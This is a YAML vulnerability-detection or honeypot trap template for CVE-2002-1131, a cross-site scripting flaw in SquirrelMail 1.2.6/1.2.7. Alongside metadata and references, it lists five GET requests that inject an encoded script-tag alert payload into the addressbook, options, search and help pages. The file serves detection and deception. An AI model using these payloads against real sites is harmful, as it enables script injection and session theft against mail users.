id: CVE-2002-1131
info:
  name: SquirrelMail 1.2.6/1.2.7 - Cross-Site Scripting
  author: dhiyaneshDk
  description: The Virtual Keyboard plugin for SquirrelMail 1.2.6/1.2.7 is prone to
    a cross-site scripting vulnerability because it fails to properly sanitize user-supplied
    input.
  severity: high
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary script code in the context of the victim''s browser, potentially
    leading to session hijacking, data theft, or other malicious activities.

    '
  remediation: 'Upgrade to a patched version of SquirrelMail or apply the necessary
    security patches to mitigate the XSS vulnerability.

    '
  reference:
  - http://www.redhat.com/support/errata/RHSA-2002-204.html
  - http://www.debian.org/security/2002/dsa-191
  - http://sourceforge.net/project/shownotes.php?group_id=311&release_id=110774
  - https://www.exploit-db.com/exploits/21811
  - https://nvd.nist.gov/vuln/detail/CVE-2002-1131
  classification:
    cvss-metrics: CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P
    cvss-score: 7.5
    cve-id: CVE-2002-1131
    cwe-id: CWE-80
    epss-score: 0.06018
    epss-percentile: 0.92781
    cpe: cpe:2.3:a:squirrelmail:squirrelmail:*:*:*:*:*:*:*:*
  metadata:
    max-request: 5
    vendor: squirrelmail
    product: squirrelmail
  tags: cve,cve2002,edb,xss,squirrelmail
traps:
- request:
    method: GET
    path: /src/addressbook.php?%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
    headers: null
    body: null
  response:
    status_code: 200
    headers:
      VulTrap: text/html
    body: </script><script>alert(document.domain)</script>
- request:
    method: GET
    path: /src/options.php?optpage=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
    headers: null
    body: null
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /src/search.php?mailbox=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&what=x&where=BODY&submit=Search
    headers: null
    body: null
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /src/search.php?mailbox=INBOX&what=x&where=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&submit=Search
    headers: null
    body: null
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /src/help.php?chapter=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
    headers: null
    body: null
  response:
    status_code: 200
    headers: {}
    body: ''
